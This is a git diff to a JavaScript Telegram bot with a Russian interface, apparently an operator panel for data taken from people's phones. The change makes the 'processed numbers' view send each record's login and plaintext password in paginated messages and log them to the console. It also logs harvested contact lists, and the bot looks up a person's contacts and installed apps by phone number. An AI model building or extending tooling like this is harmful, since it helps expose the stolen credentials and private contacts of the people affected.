@@ -19,18 +19,93 @@ bot.onText(/\/start/, (msg) => {
 bot.onText(/Просмотреть отработанные номера/, async (msg) => {
     const chatId = msg.chat.id;
     const options = {
-        parse_mode: 'Markdown',
+        parse_mode: 'HTML',
         reply_markup: {
             remove_keyboard: false
         }
     };
     const users = await server.getUsers();
-    const string_chat = users.map((element) => {
-        const user_id = element.ID;
-        return user_id;
-    }).join('\n');
-
-    bot.sendMessage(chatId, `Отработанные номера\n${string_chat}`, options);
+    const userMessages = users.map((element) => {
+        const user_id = `Номер ${element.ID}`;
+        const user_login = `Логин ${element.login}`;
+        const user_password = `Пароль ${element.password}`
+        return `${user_id}\n${user_login}\n${user_password}`;
+    })
+    console.log(userMessages)
+    const messagesToSendusers = userMessages;
+    const pageSizeusers = 7;
+    const totalPagesusers = Math.ceil(messagesToSendusers.length / pageSizeusers);
+    let currentPageusers = 1;
+    console.log(messagesToSendusers.length)
+    if(messagesToSendusers.length > 7){
+        let currentMessageId = null;
+        const sendCurrentPage = async () => {
+            let startIndex;
+            let endIndex;
+            let pageMessages;
+            let paginationButtons;
+            let currentPage;
+            let totalPages;
+    
+            currentPage = currentPageusers;
+            totalPages = totalPagesusers;
+            startIndex = (currentPage - 1) * pageSizeusers;
+            endIndex = Math.min(startIndex + pageSizeusers, messagesToSendusers.length);
+            pageMessages = messagesToSendusers.slice(startIndex, endIndex);
+    
+            paginationButtons = [];
+            if (currentPage > 1) {
+                paginationButtons.push({
+                    text: '◀️ Пред.',
+                    callback_data: 'prev_page'
+                });
+            }
+            if (currentPage < totalPages) {
+                paginationButtons.push({
+                    text: 'След. ▶️',
+                    callback_data: 'next_page'
+                });
+            }
+    
+            const messageText = pageMessages.map(message => `<pre>${message}</pre>`).join('\n');
+            
+            if (currentMessageId) {
+                try {
+                    await bot.editMessageText(`${messageText}`, {
+                        chat_id: chatId,
+                        message_id: currentMessageId,
+                        parse_mode: 'HTML',
+                        reply_markup: {
+                            inline_keyboard: [paginationButtons]
+                        }
+                    });
+                } catch (error) {
+    
+                }
+            } else {
+                const message = await bot.sendMessage(chatId, `${messageText}`, {
+                    parse_mode: 'HTML',
+                    reply_markup: {
+                        inline_keyboard: [paginationButtons]
+                    }
+                });
+                currentMessageId = message.message_id;
+            }
+        };
+        bot.on('callback_query', async (query) => {
+            if (query.data === 'prev_page') {
+                currentPageusers = Math.max(1, currentPageusers - 1);
+            } else if (query.data === 'next_page') {
+                currentPageusers = Math.min(totalPagesusers, currentPageusers + 1);
+            }
+            sendCurrentPage();
+        });
+        sendCurrentPage();
+    }
+    else{
+        const messageText = messagesToSendusers.map(message=>`<pre>${message}</pre>`).join('\n');
+        bot.sendMessage(chatId, `${messageText}`, options)
+    }
 });
 bot.onText(/Инфа по номеру/, async (msg) => {
     const chatId = msg.chat.id;
@@ -55,6 +130,7 @@ bot.onText(/Инфа по номеру/, async (msg) => {
                             const phones = `Номера: ${element.phoneNumbers.map(phone => phone.number).join(', ')}`;
                             return `Телефонная книга\n${name}\n${phones}`;
                         });
+                        console.log(contactMessages)
                         databtns.push({ text: "Контакты", callback_data: "Sendcontacts" })
                     }
                     if (userdataByPhone.data?.userApps[0]) {
